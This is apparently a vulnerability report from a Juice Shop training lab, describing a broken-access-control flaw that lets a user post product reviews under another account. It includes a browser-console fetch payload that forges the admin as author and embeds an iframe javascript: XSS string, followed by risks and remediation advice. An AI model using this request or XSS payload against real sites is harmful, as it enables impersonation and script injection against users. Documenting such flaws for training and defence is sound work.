### **Methodology**

1. **Interception of Request**
   - Used DevTools in the browser to intercept the `PUT` request sent to `/rest/products/1/reviews` when posting a normal review.
   - The intercepted request revealed that the `author` field in the request body could be modified without server-side validation.

2. **Modification of Request**
   - Sent a modified `PUT` request directly from the browser console, changing the `author` field to `admin@juice-sh.op` to mimic another user.
   - The request was constructed using the `fetch` API with the following payload:
     ```js
     fetch('/rest/products/1/reviews', {
       method: 'PUT',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         message: '<iframe src="javascript\:alert(1)">',
         author: 'admin@juice-sh.op'
       }),
       credentials: 'include'
     }).then(r => r.json()).then(console.log)
     ```

3. **Tools Used**
   - **Browser DevTools** (for intercepting and modifying requests)
   - **JavaScript `fetch` API** (for sending the modified request)

---

### **Vulnerabilities**

1. **Vulnerability Name**
   - **Broken Access Control** (CWE-284)

2. **Affected Components**
   - **Review Submission System** (specifically the `/rest/products/1/reviews` endpoint)

3. **Severity Level**
   - **High**
     - Allows unauthorized users to impersonate other users, potentially leading to misinformation, reputational damage, or further exploitation.

---

### **Risks**

1. **Business Impact**
   - **Data Integrity**: False reviews can mislead other users, affecting purchasing decisions.
   - **Reputational Damage**: The platform's credibility may be compromised if users realize reviews can be manipulated.
   - **Legal Risks**: Misleading content could lead to legal consequences, especially if the platform is used for regulated products.

2. **Exploitation Potential**
   - Attackers can post reviews as any user, including administrators, to manipulate public perception.
   - The vulnerability can be chained with other attacks (e.g., XSS) to escalate impact.

---
### **Actions**

#### **Risk Mitigation Strategies**
- **Server-Side Validation**: Ensure the `author` field in review submissions matches the authenticated user's email.
- **Input Sanitization**: Validate and sanitize all user inputs, especially those involving sensitive operations like review submissions.
- **Authentication Checks**: Implement robust authentication checks to verify user ownership of the submitted data.

#### **Remediation Fixes**
- **Backend Modifications**:
  - Add middleware to validate the `author` field against the authenticated user's session data.
  - Ensure the server-side logic enforces ownership of submitted reviews.
- **Database Constraints**:
  - Add constraints to prevent unauthorized modifications to the `author` field in the database.

#### **Best Security Practices**
- **Principle of Least Privilege**: Ensure users can only perform actions they are authorized for.
- **Regular Audits**: Conduct regular security audits to identify and fix similar vulnerabilities.
- **User Education**: Educate users about the risks of sharing sensitive information and the importance of strong authentication.

---
